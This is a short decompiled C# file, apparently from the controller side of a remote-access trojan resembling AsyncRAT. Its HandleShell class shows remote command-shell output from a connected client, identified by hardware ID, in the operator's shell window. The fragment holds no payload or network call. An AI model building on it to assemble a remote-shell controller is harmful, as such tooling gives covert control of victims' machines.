using System;
using System.Windows.Forms;
using Server.Connection;
using Server.Forms;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x02000073 RID: 115
	public class HandleShell
	{
		// Token: 0x0600030A RID: 778 RVA: 0x00021120 File Offset: 0x0001F320
		public HandleShell(MsgPack unpack_msgpack, Clients client)
		{
			FormShell formShell = (FormShell)Application.OpenForms["shell:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
			if (formShell != null)
			{
				if (formShell.Client == null)
				{
					formShell.Client = client;
					formShell.timer1.Enabled = true;
				}
				formShell.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("ReadInput").AsString);
				formShell.richTextBox1.SelectionStart = formShell.richTextBox1.TextLength;
				formShell.richTextBox1.ScrollToCaret();
			}
		}
	}
}
